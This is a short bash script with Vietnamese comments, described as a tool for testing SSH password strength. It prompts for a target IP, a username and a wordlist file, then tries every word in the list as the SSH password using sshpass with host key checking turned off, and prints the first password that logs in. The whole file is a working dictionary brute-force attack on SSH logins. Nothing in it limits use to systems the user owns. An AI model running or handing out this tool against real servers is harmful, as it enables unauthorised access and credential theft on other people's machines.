#/bin/bash
#script scan password ssh
# Dung de test ve do an toan cua password
# Nguoi thuc hien: Vac Chay Di TU
##################################

read -p"IP Server Check: " ipaddr
if [ "$ipaddr" = "" ]; then
    printf "Error: IP Addr not null"
    sleep 5
    sh $tf
fi
echo ""
read -p"User Check: " usrcheck
if [ "$usrcheck" = "" ]; then
    printf "Error: user not null"
    sleep 5
    sh $tf
fi
echo ""
read -p"Tu Dien Check: " dircheck

for i in $( cat $dircheck );
do
#echo "$usrcheck@$ipaddr"
abc=`sshpass -p "$i" ssh -o StrictHostKeyChecking=no "$usrcheck"@"$ipaddr" w 2>/dev/null`
if [ "$abc" != "" ];
then
	echo "$usrcheck@$ipaddr and password: $i"
exit 1
fi
done
echo "tu dien ko co password can tim"
